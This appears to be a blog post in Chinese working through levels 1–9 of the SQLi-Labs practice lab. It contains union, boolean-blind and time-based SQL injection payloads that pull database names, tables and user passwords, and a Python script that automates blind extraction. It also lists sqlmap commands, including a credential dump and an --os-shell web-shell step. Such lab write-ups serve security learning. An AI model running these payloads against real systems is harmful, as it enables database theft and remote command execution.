# SQL-Lab做题记录


&gt; 1-10 都是比较简单的注入，主要熟悉一下注入  
&gt; 无绕过、过滤等方法

# 联合注入
## Less-1 单引号字符型
### 判断字符型 or 数字型
```
?id=1 and 1=1
```
```
?id=1&#39; and &#39;1&#39;=&#39;1
```
### 联合注入，查列数
查列数
```
?id=1&#39;order by 3 --&#43;
```
### 爆显位
```
?id=-1&#39;union select 1,2,3--&#43;
```
### 获取数据库名字和版本号
```
?id=-1&#39;union select 1,database(),version()--&#43;
```
### 爆表
information_schema.tables表示该数据库下的tables表，点表示下一级。  
where后面是条件，group_concat()是将查询到结果连接起来
```
?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--&#43;
```
### 爆字段
查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。
&gt; 注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名
```
?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--&#43;
```
### 获取数据
通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。
```
?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--&#43;
```

## Less-2 简单数字型注入
### 判断字符型 or 数字型
确认是数字型注入
```
?id=1 and 1=1
```
### 联合注入，查列数
查列数
```
?id=1 order by 3
```
### 爆显位
```
?id=-1 union select 1,2,3
```
### 获取数据库名字和版本号
```
?id=-1 union select 1,database(),version()
```
### 爆表
```
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;
```
### 爆字段
```
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;
```
### 获取数据
```
?id=-1 union select 1,2,group_concat(id, username, password) from users
```
## Less-3 单引号字符型且有括号
### 判断字符型 or 数字型
从报错信息发现是**单引号字符型且有括号**
```
# the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1
?id=1&#39;
# 无报错
?id=1&#39; and &#39;1&#39;=&#39;1
```
### 闭合
```
# 报错
?id=1&#39;)
# 不报错
?id=1&#39;)--&#43;
```
### 联合注入，查列数
查列数
```
?id=1&#39;) order by 3--&#43;
```
### 爆显位
```
?id=1&#39;) union select 1,2,3--&#43;
```
### 获取数据库名字和版本号
```
?id=1&#39;) union select 1,database(),version()--&#43;
```
### 爆表
```
?id=1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--&#43;
```
### 爆字段
```
?id=1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--&#43;
```
### 获取数据
```
?id=1&#39;) union select 1,2,group_concat(id, username, password) from users--&#43;
```
## Less-4 双引号字符型且有括号
```
# 无任何报错，所以不是单引号型
?id=1&#39; and 1=1
# 不加末尾注释，报错
?id=1&#34;)--&#43;
?id=1&#34;) order by 3--&#43;
?id=-1&#34;) union select 1,2,3--&#43;
?id=-1&#34;) union select 1,database(),version()--&#43;
?id=-1&#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--&#43;
?id=-1&#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--&#43;
?id=-1&#34;) union select 1,2,group_concat(username ,id , password) from users--&#43;
```
# 布尔盲注
```
import requests

requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

def GetDBName(url, flag):
    DBName = &#39;&#39;
    print(&#34;开始获取数据库名长度...&#34;)
    len = 0
    for l in range(1,99):
        print(&#34;[&#43;] 尝试长度：&#34; &#43; ascii(l))
        payload = f&#34; and length((select database()))={l}--&#43;&#34;
        res = conn.get(url=url&#43;payload)
        # print(res.content)
        if flag in res.content.decode(&#34;utf-8&#34;):
            print(&#34;数据库名长度为：&#34;&#43;str(l))
            len = l
            break
    print(&#34;开始获取数据库名...&#34;)
    for i in range(1, len&#43;1):
        for j in range(33, 127):
            # print(&#34;[&#43;] Try &#34; &#43; ascii(j))
            payload = f&#34; and ascii(substr((select database()),{i},1))={j}--&#43;&#34;
            res = conn.get(url=url&#43;payload)
            if flag in res.content.decode(&#34;utf-8&#34;):
                DBName &#43;= chr(j)
                print(DBName)
                break
    return DBName

def GetTables(url,db):
    print(&#34;正在获取数据表数量&#34;)
    tnum = 0
    t_len = 0
    tname = &#34;&#34;
    for i in range(1,50):
        payload = f&#34; and (select count(*)table_name from information_schema.tables where table_schema=database())={i}--&#43;&#34;
        res = conn.get(url=url &#43; payload)
        if flag in res.content.decode(&#34;utf-8&#34;):
            tnum = i
            print(f&#34;共有{i}张表&#34;)
            break
    for i in range(0,tnum):
        for n in range(1,50):
            payload = f&#34; and length(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),1))={n}--&#43;&#34;
            res = conn.get(url=url &#43; payload)
            if flag in res.content.decode(&#34;utf-8&#34;):
                print(f&#34;第{i&#43;1}张表的长度为{n}&#34;)
                t_len = n
                break
        for l in range(1,t_len&#43;1):
            for j in range(33,127):
                payload = f&#34;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{l},1))={j}--&#43;&#34;
                res = conn.get(url=url &#43; payload)
                if flag in res.content.decode(&#34;utf-8&#34;):
                    tname &#43;= chr(j)
                    print(tname)
                    break
        tname &#43;= &#39;,&#39;
    result_list = tname[:-1].split(&#34;,&#34;)
    return result_list


def GetColumn(url, tableName):
    print(&#34;正在获取字段数量&#34;)
    cnum = 0
    c_len = 0
    cname = &#34;&#34;

    for i in range(1, 50):
        payload = f&#34; and (select count(*) from information_schema.columns where table_name=&#39;{tableName}&#39;)={i}--&#43;&#34;
        res = conn.get(url=url &#43; payload)
        if flag in res.content.decode(&#34;utf-8&#34;):
            cnum = i
            print(f&#34;共有{i}字段&#34;)
            break

    for i in range(0, cnum):
        for n in range(1, 50):
            payload = f&#34; and length(substr((select column_name from information_schema.columns where table_name=&#39;{tableName}&#39; limit {i},1),1))={n}--&#43;&#34;
            res = conn.get(url=url &#43; payload)
            if flag in res.content.decode(&#34;utf-8&#34;):
                print(f&#34;第{i &#43; 1}个字段的长度为{n}&#34;)
                c_len = n
                break

        for l in range(1, c_len &#43; 1):
            for j in range(33, 127):
                payload = f&#34; and ascii(substr((select column_name from information_schema.columns where table_name=&#39;{tableName}&#39; limit {i},1),{l},1))={j}--&#43;&#34;
                res = conn.get(url=url &#43; payload)
                if flag in res.content.decode(&#34;utf-8&#34;):
                    cname &#43;= chr(j)
                    print(cname)
                    break
        cname &#43;= &#39;,&#39;

    result_list = cname[:-1].split(&#34;,&#34;)
    return result_list

def GetColumnData(url, columnName, tableName):
    print(f&#34;正在获取表 {tableName} 中字段 {columnName} 的数据内容&#34;)
    data_count = 0
    data_len = 0
    data_content = &#34;&#34;

    # 首先获取表中该字段的所有数据行的数量
    for i in range(1, 50):
        payload = f&#34; and (select count(*) from {tableName})={i}--&#43;&#34;
        res = conn.get(url=url &#43; payload)
        if flag in res.content.decode(&#34;utf-8&#34;):
            data_count = i
            print(f&#34;字段 {columnName} 中共有 {i} 行数据&#34;)
            break

    # 然后逐行获取每条数据的长度和内容
    for i in range(0, data_count):
        # 获取每条数据的长度
        for n in range(1, 50):
            payload = f&#34;  and length((select {columnName} from {tableName} limit {i}, 1))={n}--&#43;&#34;
            res = conn.get(url=url &#43; payload)
            if flag in res.content.decode(&#34;utf-8&#34;):
                print(f&#34;第 {i &#43; 1} 行数据的长度为 {n}&#34;)
                data_len = n
                break

        # 获取每条数据的具体内容
        row_data = &#34;&#34;
        for l in range(1, data_len &#43; 1):
            for j in range(33, 127):  # 遍历 ASCII 字符集
                payload = f&#34; and ascii(substr((select {columnName} from {tableName} limit {i}, 1), {l}, 1))={j}--&#43;&#34;
                res = conn.get(url=url &#43; payload)
                if flag in res.content.decode(&#34;utf-8&#34;):
                    row_data &#43;= chr(j)
                    print(f&#34;当前数据: {row_data}&#34;)
                    break
        data_content &#43;= row_data &#43; &#34;\n&#34;

    return data_content


def chooseTable():
    tableName = input(&#34;请输入要继续查询的表格名字: &#34;)
    return tableName

def chooseColumn():
    columnName = input(&#34;请输入要继续查询的字段名字:[输入0以结束] &#34;)
    return columnName

if __name__ == &#39;__main__&#39;:
    url = &#34;http://localhost:8977/Less-6/?id=1\&#34;&#34; # 记得闭合好
    flag = &#34;You are in...........&#34;

    DBName = GetDBName(url, flag)

    result_list1 = GetTables(url, DBName)

    print(result_list1)
    choosenTableName = chooseTable()
    result_list2 = GetColumn(url, choosenTableName)

    choosenColumnName = &#39;&#39;
    while choosenColumnName != &#34;0&#34;:
        print(result_list2)
        choosenColumnName = chooseColumn()
        GetColumnData(url, choosenColumnName, choosenTableName)
```
## Less-5 基于单引号闭合
布尔盲注主要用到length(),ascii() ,substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注向对于联合注入来说需要花费大量时间
```
?id=1&#39;and length((select database()))&gt;9--&#43;
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4
?id=1&#39;and ascii(substr((select database()),1,1))=115--&#43;
#substr(&#34;78909&#34;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
 
?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--&#43;
判断所有表名字符长度。
?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--&#43;
逐一判断表名
 
?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--&#43;
判断所有字段名的长度
?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--&#43;
逐一判断字段名。
 
 
?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--&#43;
判断字段内容长度
?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--&#43;
逐一检测内容。
```
## Less-6 基于双引号闭合
同上，但是闭合方法不一样

## Less-7 基于单引号和双括号闭合
id=1&#39;))
## Less-8 无报错基于单引号闭合
只不过第八关没有报错信息，但是有you are in..进行参照。id参数是一个单引号字符串。

# 时间盲注
## Less-9
特点：无论输入```id=1&#39;```还是```id=-1&#39;```都是相同回显  
测试用例
```
?id=1&#39; and if(1=2,sleep(2),0)-- s //立刻刷新
?id=1&#39; and if(1=1,sleep(2),0)-- s //转两秒刷新
```

sqlmap工具使用
```
#获取所有数据库名称
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --dbs
#获取当前数据库
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --current-db
#获取数据库security所有表名称
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --tables -D security
#获取数据库security的users表的所有列名
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --columns -D security -T users
#获取数据库security的users表的username和password列的值
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --dump -D security -T users -C username,password
#写马
python sqlmap.py -u &#34;http://192.168.101.16/sqli-labs-master/Less-9/?id=1&#34; --os-shell 
```

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-sql-lab/  

